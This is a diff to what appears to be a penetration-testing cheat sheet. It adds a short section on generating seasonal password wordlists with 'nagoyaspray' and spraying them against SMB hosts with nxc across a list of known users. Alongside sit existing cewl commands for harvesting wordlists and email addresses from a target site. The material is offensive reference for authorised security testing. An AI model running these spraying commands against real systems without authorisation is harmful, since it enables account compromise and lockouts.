@@ -64,3 +64,16 @@ Generate a target-specific wordlist and collect email addresses from the site.
 cewl http://<TARGET> -d 2 -m 5 -o wordlist.txt
 cewl http://<TARGET> -e -o wordlist.txt
 ```
+
+### Nagoyaspray Seasonal Wordlist
+
+#Username #Password #InitialAccess
+Create seasonal password candidates with `nagoyaspray`, then spray carefully only after checking lockout policy.
+
+```sh
+# Generate seasonal password candidates.
+nagoyaspray --seasons --start <YEAR> --end <YEAR> -o seasons-<YEAR>.txt
+
+# Spray the generated wordlist against known users.
+nxc smb <TARGET_IP> -u users.txt -p seasons-<YEAR>.txt --continue-on-success
+```
